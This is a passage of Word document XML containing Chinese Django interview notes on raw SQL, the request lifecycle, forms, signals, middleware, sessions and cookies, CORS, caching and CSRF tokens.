        <w:t>里写原生</w:t>
      </w:r>
      <w:r w:rsidR="00F0460B" w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00F0460B" w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，怎么判断他走了索引或者是全局查了一次</w:t>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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD87C58" w14:textId="033AA311" w:rsidR="00F0460B" w:rsidRPr="0028142F" w:rsidRDefault="00F0460B" w:rsidP="0028142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8142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>答：不知道</w:t>
      </w:r>
      <w:r w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01796906" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00F0460B" w:rsidP="0028142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8142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django中的ORM提供的操作功能有限，在模型提供的API不能满足实际工作需要时，可以在ORM中直接执行原生sql语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2723E6" w14:textId="601ADC11" w:rsidR="00F0460B" w:rsidRPr="0028142F" w:rsidRDefault="00F0460B" w:rsidP="0028142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8142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django提供两种方法使用原生SQL进行查询：一种是使用raw（）方法，进行原生SQL查询并返回模型实例：另一种是完全避开模型层，直接咨询自定义的SQL语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A8F23B" w14:textId="039FACCE" w:rsidR="0028142F" w:rsidRPr="0028142F" w:rsidRDefault="0028142F" w:rsidP="00F0460B">
      <w:pPr>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025</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00F0460B" w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>你们之前的项目上线了是怎么看他死了没</w:t>
      </w:r>
      <w:r w:rsidR="00F0460B" w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC33C5B" w14:textId="2254AFF2" w:rsidR="00F0460B" w:rsidRPr="0028142F" w:rsidRDefault="00F0460B" w:rsidP="0028142F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>答：不清楚，这是运维做的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381E0A02" w14:textId="469F5007" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="0028142F"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026</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请求的生命周期？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7372B3C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用户请求 --&gt; wsgi --&gt; jango的中间件(方法process_request) --&gt; url路由匹配 --&gt; 视图 --&gt; orm数据库操作 --&gt; 模板渲染 --&gt; 中间件(方法process_response) --&gt; wsgi --&gt;用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1268F82D" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="001E7149">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2ACEDE65" wp14:editId="5D368708">
            <wp:extent cx="9358457" cy="3213463"/>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386229" cy="3222999"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="60058015"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22.</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的内置组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0F86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表单form：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4499C4C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对用户请求的数据进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1E0A5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生成HTML标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D805AF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PS：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502F878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form对象是一个可迭代对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6E59C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问题：如何实现choice的数据实时更新？（动态数据，而不是写死）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0676C8B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解决：给该字段定义成</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的时候利用好"</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FEC8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UserForm(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5B12E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ut_id = </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w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">=models.UserType.objects.all())    　　# 从另一张依赖表中提取数据 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F0E89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依赖表：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F176C9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UserType(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AE2CEF" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00B84101"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title = models.CharField(max_length=32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FE904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信号signal：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F1201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django的信号其实就是django内部为开发者预留的一些自定制功能的钩子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41693D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只要在某个信号中注册了函数，那么django内部执行的过程中就会自动触发注册在信号中的函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D57A04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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AD3A29" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>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pre_save &amp; post_save    </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模型的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>save()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法调用之前或之后发送信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019CF35E" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>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pre_delete &amp; post_delete    </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模型或查询集的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>delete()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法调用之前或之后发送信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3100A9" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>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request_started &amp; request_finished    </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>当接收和关闭</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求时发送信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF35758" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>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m2m_changed    </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>当多对多字段被修改时发送信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216AAB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场景:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143E5F7E" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00B84101"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在数据库某些表中添加数据时，可以进行日志记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E22CC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中间件middleware：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130FE274"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对所有的【请求】进行【批量】处理，说得直白一点中间件是帮助我们在视图函数执行之前和执行之后都可以做一些额外的操作，它本质上就是一个自定义类。其影响的是全局，需谨慎使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7B6265"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应用：用户登录校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0386613F"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问题：为甚么不使用装饰器？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ADCBD7C" w14:textId="077A8D2B" w:rsidR="001E7149" w:rsidRPr="00B84101"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如果不使用中间件，就需要给每个视图函数添加装饰器，太繁琐。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015E2D2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权限：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170142EA"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用户登录后，将权限放到session中，然后再每次请求进来在中间件里，根据当前的url去session中匹配，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F78C7C" w14:textId="554D7152"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判断当前用户是否有权限访问当前url，有权限就继续访问，没有就返回，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D53DE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检查的东西就可以放到中间件中进行统一处理，在process_request方法里面做的，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB57A03"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我们的中间件是放在session后面，因为中间件需要到session里面取数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F169D4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会话session：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119CA4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cookie与session区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4171F2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（a）cookie是保存在浏览器端的键值对，而session是保存的服务器端的键值对，但是依赖cookie。（也可以不依赖cookie，可以放在url，或请求头但是cookie比较方便）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE6859B"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（b）以登录为例，cookie为通过登录成功后，设置明文的键值对，并将键值对发送客户端存，明文信息可能存在泄漏，不安全；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6361CA" w14:textId="2670C29B"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session则是生成随机字符串，发给用户，并写到浏览器的cookie中，同时服务器自己也会保存一份。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CB0F2D"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（c）在登录验证时，cookie：根据浏览器发送请求时附带的cookie的键值对进行判断，如果存在，则验证通过；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAB4EE3" w14:textId="7CA0683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session：在请求用户的cookie中获取随机字符串，根据随机字符串在session中获取其对应的值进行验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFE1F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跨域请求cors（场景：前后端分离时，本地测试开发时使用）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C076A1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如果网站之间存在跨域，域名不同，端口不同会导致出现跨域，但凡出现跨域，浏览器就会出现同源策略的限制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537DCC9F"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解决：在我们的服务端给我们响应数据，加上响应头 --&gt; 在中间件加的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E29D87"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缓存cache：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A8484C"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常用的数据放在缓存里面，就不用走视图函数，请求进来通过所有的process_request，会到缓存里面查数据，有就直接拿，没有就走视图函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD0C8AF"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关键点：1：执行完所有的process_request才去缓存取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B03A76"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BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　2：执行完所有的process_response才将数据放到缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1FC88E" w14:textId="57AFADED"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>关于缓存问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5DAC6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1:为什么放在最后一个process_request才去缓存？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46ACBE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因为需要验证完用户的请求，才能返回数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0E18C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2:什么时候将数据放到缓存中？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D914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第一次走中间件，缓存没有数据，会走视图函数，取数据库里面取数据，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EB07F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当走完process_response,才将数据放到缓存里，因为，走process_response的时候可能给我们的响应加处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BC502B" w14:textId="77777777" w:rsidR="00D8288D"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3:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为什么使用缓存？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD3430D" w14:textId="77777777" w:rsidR="00D8288D"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将常用且不太频繁修改的数据放入缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7116FC" w14:textId="77777777" w:rsidR="00D8288D"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以后用户再来访问，先去缓存查看是否存在，如果有就返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789D3611" w14:textId="4FC039AA" w:rsidR="001E7149" w:rsidRPr="00BF3003"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否则，去数据库中获取并返回给用户（再加入到缓存，以便下次访问）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423011E0" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150"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CSRF-TOKEN</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E3AD03" w14:textId="77777777" w:rsidR="00D8288D"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目标：防止用户直接向服务端发起</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03536976" w14:textId="77777777" w:rsidR="00D8288D"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对所有的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求做验证，将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jango</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>生成的一串字符串发送给后台，一种是从请求体发过来，一种是放在隐藏的标签里面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE92CB6" w14:textId="77777777" w:rsidR="00D8288D"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方案：先发送</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求时，将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>保存到：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>表单中（隐藏的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>input</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492AA733" w14:textId="320174C3" w:rsidR="001E7149" w:rsidRPr="00BF3003"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以后再发送请求时只要携带过来即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045D2DCB"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23.</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中间件的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
